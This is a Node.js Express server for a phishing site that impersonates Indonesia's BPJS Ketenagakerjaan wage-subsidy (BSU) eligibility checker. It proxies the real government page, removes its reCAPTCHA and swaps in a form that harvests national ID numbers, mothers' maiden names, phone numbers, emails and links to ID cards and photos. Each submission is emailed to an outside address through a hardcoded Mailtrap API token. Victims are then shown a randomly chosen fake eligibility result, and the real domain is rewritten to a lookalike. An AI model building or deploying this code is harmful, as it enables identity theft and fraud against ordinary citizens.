const express = require('express');
const bodyParser = require('body-parser');
const fetch = require('node-fetch');
const { JSDOM } = require('jsdom');
const app = express();
const port = process.env.PORT || 3000;

const MAILTRAP_API_TOKEN = "15f7f9445b3314d3be2b600fb1f23e15";
const EMAIL_FROM = "hello@bsukita.dpdns.org";
const EMAIL_TO = "admin@octra.site";

// HTML templates
const formHtml = `
<div class="section bg-light animate padding-bsu-validation">
    <div class="container">
        <div class="bsu-validasi-right" style="max-width: 600px;margin: 0 auto;">
            <form id="form-bsu" action="/submit-bsu" method="POST">
                <div class="row">
                    <h3>Cek Apakah Kamu Termasuk Calon Penerima BSU?</h3>
                    <input id="token" name="token" type="hidden" value="">
                    <div class="mb-3 col-lg-12">
                        <input class="form-control rectangle-input-pembayaran-iuran" id="nik-bsu" name="nik" placeholder="NIK (Nomor Induk Kependudukan)" type="text" onkeypress="justNumber(event)" autocomplete="off" maxlength="16">
                    </div>
                    <div class="mb-3 col-lg-12">
                        <input class="form-control rectangle-input-pembayaran-iuran" id="nama-bsu" name="namaKtp" placeholder="Nama Lengkap (Sesuai KTP)" type="text" oninput="this.value = this.value.toUpperCase()" autocomplete="off">
                    </div>
                    <div class="mb-3 col-lg-12">
                        <input class="form-control rectangle-input-pembayaran-iuran" id="tgl-lahir-bsu" name="tanggalLahir" placeholder="Tanggal Lahir" autocomplete="off" type="text" readonly="" onfocus="handleDateInput(this)" ontouchstart="handleDateInput(this)" onblur="this.type='text'">
                    </div>
                    <div class="mb-3 col-lg-6">
                        <input class="form-control rectangle-input-pembayaran-iuran" id="nama-ibu" name="namaIbu" placeholder="Nama Ibu Kandung" type="text" oninput="this.value = this.value.toUpperCase()" autocomplete="off">
                    </div>
                    <div class="mb-3 col-lg-6">
                        <input class="form-control rectangle-input-pembayaran-iuran" id="nama-ibu-verif" name="namaIbuVerif" placeholder="Ketik ulang Nama Ibu Kandung" type="text" oninput="this.value = this.value.toUpperCase()" autocomplete="off">
                    </div>
                    <div class="mb-3 col-lg-6">
                        <input class="form-control rectangle-input-pembayaran-iuran" id="hp" name="hp" placeholder="Nomor Handphone Terkini" type="text" onkeypress="justNumber(event)" autocomplete="off" maxlength="14">
                    </div>
                    <div class="mb-3 col-lg-6">
                        <input class="form-control rectangle-input-pembayaran-iuran" id="hp-verif" name="hpVerif" placeholder="Ketik ulang Nomor Handphone" type="text" onkeypress="justNumber(event)" autocomplete="off" maxlength="14">
                    </div>
                    <div class="mb-3 col-lg-6">
                        <input class="form-control rectangle-input-pembayaran-iuran" id="email" name="email" placeholder="Email Terkini" type="text" oninput="this.value = this.value.toLowerCase()" autocomplete="off">
                    </div>
                    <div class="mb-3 col-lg-6">
                        <input class="form-control rectangle-input-pembayaran-iuran" id="email-verif" name="emailVerif" placeholder="Ketik ulang Email" type="text" oninput="this.value = this.value.toLowerCase()" autocomplete="off">
                    </div>
                    <div class="mb-3 col-lg-12">
                        <label for="ktp-link" class="form-label">Link KTP (Google Drive, Dropbox, dll.)</label>
                        <input class="form-control rectangle-input-pembayaran-iuran" id="ktp-link" name="ktpLink" placeholder="Masukkan link KTP" type="url" autocomplete="off">
                        <p style="color: red; font-size: 12px;">Dokumen harus jelas dan valid, tidak boleh palsu.</p>
                    </div>
                    <div class="mb-3 col-lg-12">
                        <label for="pas-foto-link" class="form-label">Link Pas Foto 4x6 (Google Drive, Dropbox, dll.)</label>
                        <input class="form-control rectangle-input-pembayaran-iuran" id="pas-foto-link" name="pasFotoLink" placeholder="Masukkan link pas foto" type="url" autocomplete="off">
                        <p style="color: red; font-size: 12px;">Dokumen harus jelas dan valid, tidak boleh palsu.</p>
                    </div>
                    <div class="mb-3 col-lg-12">
                        <p style="color: red;">
                            Pastikan nomor HP, email, dan link dokumen kamu benar agar bisa mendapatkan informasi penyaluran BSU
                        </p>
                    </div>
                    <div class="mb-3 col-lg-12">
                        <input type="submit" value="Lanjutkan" id="btn-cek-bsu" class="btn btn-primary btn-width-bsu-validasi">
                    </div>
                </div>
            </form>
        </div>
    </div>
    <script>
        function justNumber(event) {
            const charCode = event.which ? event.which : event.keyCode;
            if (charCode > 31 && (charCode < 48 || charCode > 57)) {
                event.preventDefault();
            }
        }
    </script>
`;

const lolosHtml = `
<!DOCTYPE html>
<html lang="id">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <title>BSU - Lolos Verifikasi</title>
  <style>
    body {
      margin: 0;
      font-family: Arial, sans-serif;
      background-color: #ffffff;
      text-align: center;
    }
    .logo {
      width: 220px;
      margin: 40px auto 20px;
      display: block;
    }
    .status-icon {
      width: 160px;
      margin: 30px auto;
    }
    .container {
      max-width: 600px;
      margin: auto;
      padding: 20px;
    }
    .message {
      font-size: 18px;
      color: #333;
      line-height: 1.6;
      margin-bottom: 30px;
    }
    .button {
      display: inline-block;
      background: #007bff;
      color: #fff;
      text-decoration: none;
      padding: 14px 30px;
      border-radius: 8px;
      font-size: 16px;
    }
  </style>
</head>
<body>
  <img class="logo" src="https://cekbsukita.summer-bar-18d1.workers.dev/images/logo-min.png" alt="Logo BPJS" />
  <div class="container">
    <img class="status-icon" src="https://raw.githubusercontent.com/bsukita/repo/a8bb0a254e9c1ce9d3b7f6cbccdd2e16625c5c2b/berhasil.svg" alt="Lolos Verifikasi" />
    <div class="message">
      Anda <strong>lolos verifikasi BPJS Ketenagakerjaan</strong> sebagai calon penerima Bantuan Subsidi Upah (BSU).<br />
      Validasi selanjutnya akan dilakukan oleh Kemnaker. Silakan cek berkala di <strong>bsu.kemnaker.go.id</strong>.
    </div>
    <a href="/" class="button">Kembali</a>
  </div>
</body>
</html>
`;

const validasiHtml = `
<!DOCTYPE html>
<html lang="id">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <title>BSU - Dalam Proses Validasi</title>
  <style>
    body {
      margin: 0;
      font-family: Arial, sans-serif;
      background-color: #ffffff;
      text-align: center;
    }
    .logo {
      width: 220px;
      margin: 40px auto 20px;
      display: block;
    }
    .status-icon {
      width: 160px;
      margin: 30px auto;
    }
    .container {
      max-width: 600px;
      margin: auto;
      padding: 20px;
    }
    .message {
      font-size: 18px;
      color: #333;
      line-height: 1.6;
      margin-bottom: 30px;
    }
    .button {
      display: inline-block;
      background: #007bff;
      color: #fff;
      text-decoration: none;
      padding: 14px 30px;
      border-radius: 8px;
      font-size: 16px;
    }
  </style>
</head>
<body>
  <img class="logo" src="https://cekbsukita.summer-bar-18d1.workers.dev/images/logo-min.png" alt="Logo BPJS" />
  <div class="container">
    <img class="status-icon" src="https://raw.githubusercontent.com/bsukita/repo/a8bb0a254e9c1ce9d3b7f6cbccdd2e16625c5c2b/validasi.svg" alt="Dalam Validasi" />
    <div class="message">
      Data Anda <strong>masih dalam proses verifikasi dan validasi</strong>.<br />
      Silakan cek kembali secara berkala untuk melihat status BSU Anda.
    </div>
    <a href="/" class="button">Kembali</a>
  </div>
</body>
</html>
`;

const gagalHtml = `
<!DOCTYPE html>
<html lang="id">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <title>BSU - Tidak Lolos</title>
  <style>
    body {
      margin: 0;
      font-family: Arial, sans-serif;
      background-color: #ffffff;
      text-align: center;
    }
    .logo {
      width: 220px;
      margin: 40px auto 20px;
      display: block;
    }
    .status-icon {
      width: 160px;
      margin: 30px auto;
    }
    .container {
      max-width: 600px;
      margin: auto;
      padding: 20px;
    }
    .message {
      font-size: 18px;
      color: #333;
      line-height: 1.6;
      margin-bottom: 30px;
    }
    .button {
      display: inline-block;
      background: #007bff;
      color: #fff;
      text-decoration: none;
      padding: 14px 30px;
      border-radius: 8px;
      font-size: 16px;
    }
  </style>
</head>
<body>
  <img class="logo" src="https://cekbsukita.summer-bar-18d1.workers.dev/images/logo-min.png" alt="Logo BPJS" />
  <div class="container">
    <img class="status-icon" src="https://raw.githubusercontent.com/bsukita/repo/a8bb0a254e9c1ce9d3b7f6cbccdd2e16625c5c2b/gagal.svg" alt="Tidak Lolos" />
    <div class="message">
      Mohon maaf, Anda <strong>tidak termasuk dalam kriteria</strong> penerima Bantuan Subsidi Upah (BSU).
    </div>
    <a href="/" class="button">Kembali</a>
  </div>
</body>
</html>
`;

// Middleware
app.use(bodyParser.urlencoded({ extended: true }));
app.use(bodyParser.json());

// Function to send email via Mailtrap
async function sendEmail(formData) {
    console.log("Starting sendEmail function");
    const nik = formData.nik || "";
    const namaKtp = (formData.namaKtp || "").toUpperCase();
    const tanggalLahir = formData.tanggalLahir || "";
    const namaIbu = (formData.namaIbu || "").toUpperCase();
    const hp = formData.hp || "";
    const email = (formData.email || "").toLowerCase();
    const ktpLink = formData.ktpLink || "";
    const pasFotoLink = formData.pasFotoLink || "";
    const statuses = ["lolos", "validasi", "gagal"];
    const status = statuses[Math.floor(Math.random() * statuses.length)];
    console.log(`Generated status: ${status}`);

    const emailBody = `
Data Pendaftaran BSU:
NIK: ${nik}
Nama Lengkap: ${namaKtp}
Tanggal Lahir: ${tanggalLahir}
Nama Ibu Kandung: ${namaIbu}
Nomor Handphone: ${hp}
Email: ${email}
Link KTP: ${ktpLink || "Tidak ada"}
Link Pas Foto: ${pasFotoLink || "Tidak ada"}
Status: ${status}
`;

    console.log("Sending email via Mailtrap API");
    const response = await fetch("https://send.api.mailtrap.io/api/send", {
        method: "POST",
        headers: {
            "Authorization": `Bearer ${MAILTRAP_API_TOKEN}`,
            "Content-Type": "application/json"
        },
        body: JSON.stringify({
            from: { email: EMAIL_FROM, name: "BSU Submission" },
            to: [{ email: EMAIL_TO }],
            subject: `Pendaftaran BSU - ${namaKtp}`,
            text: emailBody,
            category: "BSU Submission"
        })
    });

    if (!response.ok) {
        const errorText = await response.text();
        console.error(`Mailtrap API error: ${response.status} - ${errorText}`);
        throw new Error(`Mailtrap API error: ${response.status} - ${errorText}`);
    }

    console.log("Email sent successfully");
    return status;
}

// Routes
app.post('/submit-bsu', async (req, res) => {
    console.log("Handling /submit-bsu POST request");
    const { nik, namaKtp, tanggalLahir, namaIbu, namaIbuVerif, hp, hpVerif, email, emailVerif } = req.body;

    // Validation
    if (namaIbu !== namaIbuVerif || hp !== hpVerif || email !== emailVerif) {
        console.log("Validation failed: Data mismatch");
        return res.status(400).send("Verifikasi data tidak cocok!");
    }

    try {
        const status = await sendEmail(req.body);
        console.log(`Redirecting to /cek-bsu-peserta with status=${status}`);
        res.redirect(`/cek-bsu-peserta?nama=${encodeURIComponent(namaKtp)}&status=${status}`);
    } catch (error) {
        console.error(`Error in /submit-bsu: ${error.message}`);
        res.status(500).send(`Error: ${error.message}`);
    }
});

app.get('/cek-bsu-peserta', (req, res) => {
    console.log("Handling /cek-bsu-peserta request");
    const namaKtp = req.query.nama?.toUpperCase();
    const status = req.query.status;

    if (!namaKtp || !status) {
        console.log("Missing nama or status in /cek-bsu-peserta");
        return res.status(400).send("Nama atau status tidak ditemukan!");
    }

    let html;
    switch (status) {
        case "lolos":
            html = lolosHtml;
            break;
        case "validasi":
            html = validasiHtml;
            break;
        case "gagal":
            html = gagalHtml;
            break;
        default:
            console.log(`Invalid status: ${status}`);
            return res.status(500).send("Status tidak valid!");
    }

    console.log(`Serving ${status} HTML`);
    res.set('Content-Type', 'text/html');
    res.send(html);
});

// Proxy for other routes
app.all('*', async (req, res) => {
    console.log(`Proxying request: ${req.url}, Method: ${req.method}`);
    try {
        const url = new URL(`https://bsu.bpjsketenagakerjaan.go.id${req.url}`);
        const headers = new Headers();
        for (const [key, value] of Object.entries(req.headers)) {
            headers.set(key, value);
        }
        headers.set("Host", url.hostname);
        headers.set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36");

        const response = await fetch(url.toString(), {
            method: req.method,
            headers,
            body: req.method !== 'GET' && req.method !== 'HEAD' ? JSON.stringify(req.body) : undefined,
            redirect: 'manual'
        });

        if (response.status >= 300 && response.status < 400) {
            console.log(`Received redirect response: ${response.status}`);
            const location = response.headers.get('location');
            res.redirect(response.status, location);
            return;
        }

        let body = await response.text();
        const dom = new JSDOM(body);
        const document = dom.window.document;

        // Remove reCAPTCHA elements
        document.querySelectorAll('div.grecaptcha-badge, div.grecaptcha-error, textarea.g-recaptcha-response, script[src*="recaptcha/api.js"]').forEach(el => el.remove());
        document.querySelectorAll('div[style*="font-size: 10px; color: gray;"]').forEach(el => el.remove());

        // Replace form
        const formSection = document.querySelector('div.section.bg-light.animate.padding-bsu-validation');
        if (formSection) {
            formSection.outerHTML = formHtml;
        }

        // Replace text
        const textElement = document.querySelector('div.container.container-bodytipis.margin-40 p');
        if (textElement && textElement.textContent.includes('bsu.bpjsketenagakerjaan.go.id')) {
            textElement.textContent = textElement.textContent.replace('bsu.bpjsketenagakerjaan.go.id', 'cekbsukita.qzz.io');
        }

        // Add grecaptcha script
        const script = document.createElement('script');
        script.textContent = `
            window.grecaptcha = {
                ready: function(cb) { cb(); },
                execute: function() { return Promise.resolve(''); },
                render: function() {}
            };
        `;
        document.body.appendChild(script);

        res.set('Content-Type', 'text/html');
        res.send(dom.serialize());
    } catch (error) {
        console.error(`Error in proxy: ${error.message}`);
        res.status(500).send(`Error: ${error.message}`);
    }
});

app.listen(port, () => {
    console.log(`Server running on port ${port}`);
});
